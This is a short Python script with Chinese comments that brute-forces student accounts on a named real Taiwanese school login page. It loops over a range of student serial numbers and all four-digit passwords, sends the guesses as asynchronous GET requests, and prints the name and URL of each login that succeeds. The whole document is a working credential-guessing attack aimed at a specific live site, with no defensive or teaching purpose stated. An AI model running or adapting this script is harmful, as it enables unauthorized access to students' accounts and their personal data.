'''
思路解析：
https://makeup.jlweb.com.tw/StuLogin.aspx?Code=0096&StuPass=XXXX&StuSN=XXXXXX
'''

from aiohttp import ClientSession
import asyncio
import time 

Code = '0096'
StuPass = 0
StuSN = 0
qishi = int(input('請輸入起始號: '))
jieshu = int(input('請輸入結束號: '))
start = input('Enter以繼續: ')



#定義協程(coroutine)
async def main():
    links = list()
    for i in range(qishi, jieshu+1):
        for j in range(1, 10000):
            i_3=str(i).zfill(3)
            j_4=str(j).zfill(4)
            links.append(
                f'https://makeup.jlweb.com.tw/StuLogin.aspx?Code=0096&StuPass={j_4}&StuSN=080{i_3}')
            print(str(j)+' | '+str(i))
 
    async with ClientSession() as session:
        tasks = [asyncio.create_task(fetch(link, session)) for link in links]  # 建立任務清單
        await asyncio.gather(*tasks)  # 打包任務清單及執行
 
#定義協程(coroutine)
async def fetch(link, session):
    async with session.get(link) as response:  #非同步發送請求
        html_body = await response.text()
        data = html_body.split(',')
        #print(data)
        if(data[0] == '1'):
            print(data[1] + ' | ' + link)


start_time = time.time()  #開始執行時間
loop = asyncio.get_event_loop()  #建立事件迴圈(Event Loop)
loop.run_until_complete(main())  #執行協程(coroutine)
print("使用:" + str(time.time() - start_time) + "秒")

